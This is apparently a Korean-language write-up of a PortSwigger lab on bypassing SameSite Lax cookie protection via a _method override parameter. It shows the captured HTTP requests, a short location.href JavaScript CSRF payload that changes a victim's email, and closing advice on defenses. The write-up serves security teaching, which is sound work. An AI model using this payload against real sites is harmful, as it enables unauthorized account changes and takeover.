+++
date = '2026-06-24T15:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - SameSite Lax bypass via method override'
summary = "기본 Lax 정책이 최상위 GET 탐색만 허용하는 환경에서 _method 파라미터로 POST를 위장해 교차 사이트 이메일 변경을 성립시키는 풀이"
toc = true
tags = ["CSRF", "SameSite", "Method Override", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

> ![image.png](/writeup/portswigger/csrf/07/1.png)

이메일 변경 기능에 CSRF 취약점이 존재한다. 제목에서 알 수 있듯 SameSite Lax 제한을 우회해야 한다. CSRF 공격으로 피해자의 이메일 주소를 변경하면 문제가 해결된다. 실습 계정은 `wiener:peter`다.

### CSRF 진단

정상적으로 이메일을 변경하고 요청을 확인한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

email=csrf%40csrf.com
```

CSRF 토큰은 없다. 대신 로그인 응답의 `Set-Cookie`를 보면 `SameSite` 속성이 아예 지정되어 있지 않다.

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=<session>; Expires=Fri, 31 Jul 2026 04:30:10 UTC; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
```

Chrome은 `SameSite`가 명시되지 않은 쿠키에 기본적으로 `Lax`를 적용한다. `Lax`는 교차 사이트 요청 중 **최상위 탐색(top-level navigation)으로 발생하는 GET 요청에만** 쿠키를 첨부하므로, 앞선 랩들에서 사용한 폼 자동 제출(`POST`)에는 쿠키가 실리지 않는다.

그렇다면 `GET`으로 보내면 되지만, 이메일 변경 엔드포인트는 `POST`를 요구한다. 문제 제목이 가리키는 메서드 오버라이드를 시도한다. 일부 프레임워크는 `_method` 파라미터로 실제 처리 메서드를 지정할 수 있게 해 두는데, 이 애플리케이션도 이를 지원한다.

```http
GET /my-account/change-email?_method=POST&email=csrf%40csrf.com HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
```

요청은 브라우저 관점에서 `GET`이지만 애플리케이션은 `POST`로 처리해 이메일을 변경한다.

---

## 익스플로잇

최상위 탐색으로 해당 URL에 접근하도록 페이로드를 구성한다.

```html
<script>
    location.href = "https://<lab-id>.web-security-academy.net/my-account/change-email?_method=POST&email=csrf4%40csrf.com";
</script>
```

`location.href` 대입은 최상위 탐색이면서 메서드가 `GET`이므로 `Lax` 조건을 정확히 만족한다. 브라우저가 세션 쿠키를 첨부하고, 서버는 `_method=POST`를 보고 변경 처리를 수행한다.

이 페이로드를 피해자에게 전달하면 문제가 해결된다.

![image.png](/writeup/portswigger/csrf/07/2.png)

---

## 정리

`SameSite=Lax`는 완전한 차단이 아니라 예외를 둔 제한이다. 사용자가 링크를 눌러 사이트로 이동하는 흐름을 깨지 않기 위해 최상위 `GET` 탐색을 허용하는데, 이 예외가 "안전한 메서드(safe method)는 상태를 바꾸지 않는다"는 HTTP 규약을 전제로 한다는 점이 핵심이다.

메서드 오버라이드는 그 전제를 정면으로 무너뜨린다. `GET`으로 도착한 요청이 애플리케이션 내부에서 `POST`로 재해석되면, 브라우저가 보기에 안전한 요청이 실제로는 상태를 변경한다. 브라우저의 판단과 애플리케이션의 처리가 어긋나는 지점에서 방어가 뚫리는 구조로, [메서드 의존 토큰 검증 랩](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-token-validation-depends-on-request-method/)과 원인이 닮아 있다.

오버라이드 기능은 Symfony를 비롯한 여러 프레임워크가 `_method` 파라미터나 `X-HTTP-Method-Override` 헤더로 제공하며, 제한된 클라이언트를 지원하기 위해 도입된 것이라 기본 활성화된 경우도 있다. 진단에서는 `GET`이 거부되더라도 오버라이드 파라미터를 함께 붙여 재시도해 보는 것이 필요하다.

방어는 세 방향이다. 오버라이드 기능이 필요 없다면 비활성화하고, 세션 쿠키에는 기본 `Lax`에 기대지 말고 `SameSite=Strict`를 명시하며, 무엇보다 SameSite를 단독 방어로 쓰지 말고 세션에 결합된 CSRF 토큰을 함께 적용해야 한다.
